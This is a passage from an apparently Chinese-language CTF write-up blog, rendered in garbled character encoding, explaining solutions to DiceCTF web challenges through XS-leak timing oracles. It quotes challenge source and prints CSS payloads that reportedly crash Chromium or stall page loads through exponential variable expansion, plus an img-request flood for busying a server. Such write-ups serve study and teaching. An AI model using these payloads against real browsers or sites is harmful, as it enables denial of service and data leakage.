&#39;none&#39;</code>ï¼Œæ‰€ä»¥ç¦æ­¢å¼•å…¥ä»»ä½•å¤–éƒ¨è³‡æº</li><li><code>sandbox</code>ï¼Œå› æ­¤ä¸èƒ½åŸ·è¡Œä»»ä½• JavaScriptï¼Œä¹Ÿç„¡æ³•é€é meta é‡æ–°å°å‘</li></ol><p>å°‘äº† JavaScript ä»¥å¾Œï¼Œå°±å°‘å¾ˆå¤šæ”»æ“Šé¢äº†ï¼Œå› æ­¤åªèƒ½å¾ HTML èˆ‡ CSS ä¸‹æ‰‹ã€‚é€™ä¸€é¡Œçš„ CSS æœ‰é–‹ unsafe-inlineï¼Œæ‰€ä»¥æ˜¯å¯ä»¥åŠ ä¸Š CSS çš„ã€‚</p><p>ä¸éç„¡è«–å¦‚ä½•ï¼Œçœ‹èµ·ä¾†éƒ½æ²’è¾¦æ³•å°å¤–ç™¼é€ requestï¼Œå› æ­¤è¦å˜›æ˜¯æ‰¾åˆ° bypassï¼ˆä¾‹å¦‚èªª dns prefetchï¼Œä½†é€™é¡Œæ‡‰è©²ä¹Ÿä¸é©ç”¨ï¼‰ï¼Œè¦å˜›å°±æ˜¯è¦æ­é…é¡Œç›®çš„å…¶ä»–éƒ¨åˆ†ã€‚</p><p>é€™ä¸€é¡Œçš„ bot çš„é‹ä½œæ–¹å¼ä¸å¤ªä¸€æ¨£ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> <span class="token punctuation">&#123;</span> createServer <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'http'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">&#123;</span> readFileSync <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'fs'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">&#123;</span> spawn <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'child_process'</span><span class="token keyword">import</span> <span class="token punctuation">&#123;</span> randomInt <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'crypto'</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token parameter">timeout</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">wait</span> <span class="token operator">=</span> <span class="token parameter">child</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> child<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'exit'</span><span class="token punctuation">,</span> resolve<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> index <span class="token operator">=</span> <span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> token <span class="token operator">=</span> <span class="token function">randomInt</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">**</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">padStart</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> browserOpen <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">visit</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token parameter">code</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  browserOpen <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> proc <span class="token operator">=</span> <span class="token function">spawn</span><span class="token punctuation">(</span><span class="token string">'node'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'visit.js'</span><span class="token punctuation">,</span> token<span class="token punctuation">,</span> code<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">detached</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">await</span> Promise<span class="token punctuation">.</span><span class="token function">race</span><span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token function">wait</span><span class="token punctuation">(</span>proc<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span>  <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>proc<span class="token punctuation">.</span>exitCode <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    process<span class="token punctuation">.</span><span class="token function">kill</span><span class="token punctuation">(</span><span class="token operator">-</span>proc<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  browserOpen <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>url<span class="token punctuation">,</span> <span class="token string">'http://localhost/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span>pathname <span class="token operator">===</span> <span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span>pathname <span class="token operator">===</span> <span class="token string">'/bot'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>browserOpen<span class="token punctuation">)</span> <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'already open!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> code <span class="token operator">=</span> url<span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'code'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>code <span class="token operator">||</span> code<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">1000</span><span class="token punctuation">)</span> <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'no'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">visit</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'visiting'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span>pathname <span class="token operator">===</span> <span class="token string">'/flag'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> token<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'wrong'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      process<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">FLAG</span> <span class="token operator">??</span> <span class="token string">'dice&#123;flag&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8080</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœ browserOpen çš„è©±ï¼Œå¯ä»¥å¾ response ä¸­å¾—çŸ¥ã€‚å› æ­¤çœ‹åˆ°é¡Œç›®å¾Œæˆ‘å°±æœ‰å€‹æƒ³æ³•ï¼Œå¦‚æœè®“ Chromium crash æœƒç™¼ç”Ÿä»€éº¼äº‹ï¼Ÿæ˜¯ä¸æ˜¯å¯ä»¥é€éé€™å€‹æ–¹å¼ä¾† leak å‡º tokenï¼Ÿ</p><p>èˆ‰ä¾‹ä¾†èªªï¼Œå‡å¦‚æˆ‘å€‘å¯«ä¸€æ¢ CSS æ˜¯ <code>h1[data-token^=&quot;0&quot;] &#123; /*crash*/ &#125;</code>ï¼Œä¾†è®“ Chromium crashï¼Œé‚£æˆ–è¨±å°±å¯ä»¥åŠ å¿«æˆ–æ˜¯æ‹–æ…¢ bot åŸ·è¡Œçš„æ™‚é–“ï¼Œé€²è€Œå¾—çŸ¥é€™å€‹ selector æ˜¯å¦ç¬¦åˆã€‚</p><p>å¾Œä¾†æ˜¯éšŠå‹å¾ Chromium issues ä¸­æ‰¾åˆ°äº†è®“ Chromium crash çš„æ–¹å¼ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">  <span class="token selector">h1[data-token^="a"]</span> <span class="token punctuation">&#123;</span>    <span class="token property">--c1</span><span class="token punctuation">:</span> <span class="token function">color-mix</span><span class="token punctuation">(</span>in srgb<span class="token punctuation">,</span> blue 50%<span class="token punctuation">,</span> red<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">--c2</span><span class="token punctuation">:</span> <span class="token function">srgb</span><span class="token punctuation">(</span>from <span class="token function">var</span><span class="token punctuation">(</span>--c1<span class="token punctuation">)</span> r g b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--c2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨è³½å¾Œè¨è«–ä¸­ä¹Ÿçœ‹åˆ° Discord å…§æœ‰äººè²¼äº† payloadï¼Œè®“ç¶²é è¼‰å…¥è®Šå¾—è¶…ç´šæ…¢ï¼Œä¹Ÿå¯ä»¥é”åˆ°é¡ä¼¼çš„æ•ˆæœï¼Œé€™æ˜¯ @Trixter è²¼çš„ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">  <span class="token selector">html:has([data-token^="a"])</span> <span class="token punctuation">&#123;</span>      <span class="token property">--a</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/?1<span class="token punctuation">)</span></span><span class="token punctuation">,</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/?1<span class="token punctuation">)</span></span><span class="token punctuation">,</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/?1<span class="token punctuation">)</span></span><span class="token punctuation">,</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/?1<span class="token punctuation">)</span></span><span class="token punctuation">,</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/?1<span class="token punctuation">)</span></span><span class="token punctuation">;</span>      <span class="token property">--b</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--a<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--a<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--a<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--a<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--a<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token property">--c</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--b<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--b<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--b<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--b<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--b<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token property">--d</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--c<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token property">--e</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--d<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--d<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--d<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--d<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--d<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token property">--f</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--e<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--e<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--e<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--e<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--e<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">  <span class="token selector">*</span><span class="token punctuation">&#123;</span>    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--f<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ‰é»åƒæ˜¯ Billion laughs attack é‚£æ¨£ï¼Œé€éä¸æ–·é‡è¤‡æ§‹é€ å‡ºä¸€å€‹è¶…å¤§ payloadï¼Œå°±å¯ä»¥æ‹–æ…¢é€Ÿåº¦ã€‚</p><p>æ‹–æ…¢é€Ÿåº¦ä»¥å¾Œå°±å¯ä»¥ç”¨å‰›å‰›è¬›éçš„æ–¹å¼å»æ¸¬é‡ç¶²é è¼‰å…¥æ‰€éœ€è¦çš„æ™‚é–“ï¼Œå› ç‚ºè¶…é 10 ç§’çš„è©±æœƒç›´æ¥ timeoutï¼Œè—‰ç”±é€™é»ä¾† leak å‡º flagã€‚</p><h2><span id="webx2fsafestlist-2-solves">web&#x2F;safestlist (2 solves)</span></h2><p>é€™é¡Œæ˜¯ä¿®æ”¹è‡ªä¹‹å‰æˆ‘æœ‰è§£éçš„ä¸€å€‹é¡Œç›®ï¼š<a href="https://blog.huli.tw/2022/10/08/sekaictf2022-safelist-and-connection/">SekaiCTF 2022 ç­†è¨˜èˆ‡ concurrent limit</a>ï¼Œæˆ‘ç°¡å–®æè¿°ä¸€ä¸‹ä¿®æ”¹å¾Œçš„ç‰ˆæœ¬ã€‚</p><p>é€™å€‹é¡Œç›®æ˜¯ä¸€å€‹ç¶“å…¸çš„ note appï¼Œä½ å¯ä»¥å»ºç«‹æ–°çš„ noteï¼Œä½†å•é¡Œæ˜¯ note å…§å®¹æœƒå…ˆç¶“é <code>DOMPurify.sanitize</code>ï¼Œæ‰€ä»¥æ²’è¾¦æ³• XSSã€‚è€Œ CSP çš„éƒ¨åˆ†æ˜¯ <code>default-src &#39;self&#39;</code>ï¼Œåªèƒ½å¾€é¡Œç›®çš„ origin ç™¼é€è«‹æ±‚ã€‚</p><p>ä¹Ÿå°±æ˜¯èªªï¼Œä½ æ²’è¾¦æ³•æŠŠè«‹æ±‚å¾€å¤–å‚³ã€‚</p><p>é™¤äº†å»ºç«‹ note ä»¥å¤–ï¼Œé‚„å¯ä»¥åˆªé™¤ noteï¼Œæ˜¯ç”¨ note çš„ index ä¾†åˆªçš„ã€‚</p><p>è€Œé€™é¡Œçš„æ ¸å¿ƒæ˜¯é€™ä¸€æ®µå»ºç«‹ note çš„ç¨‹å¼ç¢¼ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">fastify<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/create"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> reply</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> text <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>text <span class="token operator">||</span> <span class="token keyword">typeof</span> text <span class="token operator">!==</span> <span class="token string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> reply<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">"text/html"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Missing text"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> userNotes <span class="token operator">=</span> notes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>id<span class="token punctuation">)</span> <span class="token operator">??</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> totalLen <span class="token operator">=</span> userNotes<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">prev<span class="token punctuation">,</span> curr</span><span class="token punctuation">)</span> <span class="token operator">=></span> prev <span class="token operator">+</span> curr<span class="token punctuation">.</span>length<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> newLen <span class="token operator">=</span> totalLen <span class="token operator">+</span> text<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>newLen <span class="token operator">></span> <span class="token number">16384</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> reply<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/?message=Cannot add, please delete some notes first (</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>newLen<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> > 16384 chars)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    userNotes<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>    userNotes<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    notes<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>id<span class="token punctuation">,</span> userNotes<span class="token punctuation">)</span><span class="token punctuation">;</span>    reply<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">"/?message=Note added successfully"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨æ„é‚£å€‹ <code>userNotes.sort();</code>ï¼Œæœƒæ ¹æ“š note çš„å…§å®¹é€²è¡Œæ’åºã€‚flag çš„æ ¼å¼æ˜¯ <code>dice&#123;[a-z]+&#125;</code>ï¼Œåˆ©ç”¨é€™å€‹æ’åºåŠŸèƒ½ï¼Œå¯ä»¥å¾—å‡ºä¸€å€‹ç°¡å–®çš„ç­–ç•¥ã€‚</p><p>å‡è¨­ flag æ˜¯ <code>dice&#123;c&#125;</code>ï¼Œè€Œæˆ‘å€‘å…ˆå»ºç«‹äº†ä¸€å€‹ <code>dice&#123;a</code> çš„ noteï¼Œå»ºç«‹å®Œä»¥å¾Œå»åˆªé™¤ç¬¬ä¸€å€‹ noteï¼Œé€™æ™‚å€™ <code>dice&#123;a</code> æœƒè¢«åˆªæ‰ï¼Œç•™ä¸‹ flag <code>dice&#123;c&#125;</code>ã€‚</p><p>è‹¥æ˜¯æˆ‘å€‘å…ˆå»ºç«‹äº† <code>dice&#123;d</code> çš„ noteï¼Œå†å»åˆªé™¤ç¬¬ä¸€å€‹ï¼Œå°±æ›æˆ <code>dice&#123;c&#125;</code> è¢«åˆªæ‰ï¼Œç•™ä¸‹å‰›å‰›å»ºç«‹çš„ <code>dice&#123;d</code>ã€‚</p><p>æ›å¥è©±èªªï¼Œå»ºç«‹ note ä»¥å¾Œå†åˆªé™¤ç¬¬ä¸€å€‹ noteï¼Œæ ¹æ“šæ’åºçš„ä¸åŒï¼Œç•™ä¸‹ä¾†çš„ note ä¹Ÿä¸åŒã€‚</p><p>å¦‚æœæˆ‘å¯ä»¥çŸ¥é“æœ€å¾Œç•™ä¸‹ä¾†çš„ note æ˜¯ä»€éº¼ï¼Œå°±èƒ½åéä¾†æ¨æ¸¬å‡º flag çš„é †åºã€‚å¦‚æœç•™ä¸‹ä¾†çš„æ˜¯æˆ‘å»ºç«‹çš„ noteï¼Œä»£è¡¨ flag ä¸€å®šæ’åœ¨å‰é¢ï¼Œå­—å…¸åºä¹Ÿåœ¨å‰é¢ã€‚</p><p>å› æ­¤é€™é¡Œçš„é‡é»å°±æ˜¯ï¼Œè©²æ€éº¼çŸ¥é“ç•™ä¸‹ä¾†çš„ note æ˜¯å“ªä¸€å€‹ï¼Ÿ</p><p>æ ¹æ“šå»å¹´çš„è§£æ³•ï¼Œæˆ‘ä¸€é–‹å§‹çš„æƒ³æ³•ä¸€æ¨£æ˜¯è®“ server side busyã€‚Node.js æ˜¯ single threadï¼Œæ‰€ä»¥åœ¨è™•ç†å®Œä¸€å€‹è«‹æ±‚ä¹‹å‰ï¼Œæ˜¯æ²’è¾¦æ³•æ¥æ”¶å…¶ä»–è«‹æ±‚çš„ï¼ˆéåŒæ­¥å‰‡æ˜¯å¦å¤–ä¸€å›äº‹ï¼‰ã€‚</p><p>æ‰€ä»¥æˆ‘çš„æƒ³æ³•æ˜¯å»ºç«‹ä¸€å€‹ noteï¼Œè£¡é¢æœ‰ä¸€å † <code>&lt;img src=/?&#123;random_number&#125;&gt;</code>ï¼Œåœ¨å­—æ•¸é™åˆ¶å…§å¤§æ¦‚å¯ä»¥ç™¼é€ 700~1000 å€‹è«‹æ±‚å·¦å³ï¼Œè—‰ç”±ç™¼ä¸€å †è«‹æ±‚çµ¦ serverï¼Œè®“ server è®Šå¾—å¿™ç¢Œã€‚</p><p>é€™é¡Œé‚„æœ‰å¦ä¸€é»ä¸åŒï¼Œé‚£å°±æ˜¯ botï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">visit</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token comment">// clear all data</span>    <span class="token keyword">await</span> fsp<span class="token punctuation">.</span><span class="token function">rm</span><span class="token punctuation">(</span>tmpDir<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">recursive</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token literal-property property">force</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> browser<span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        browser <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">launchBrowser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// set flag</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span><span class="token string">"http://localhost:3000"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">7500</span><span class="token punctuation">,</span> <span class="token literal-property property">waitUntil</span><span class="token operator">:</span> <span class="token string">"networkidle2"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">flag</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">"input[type=text]"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> flag<span class="token punctuation">;</span>            document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">"form[action='/create']"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token 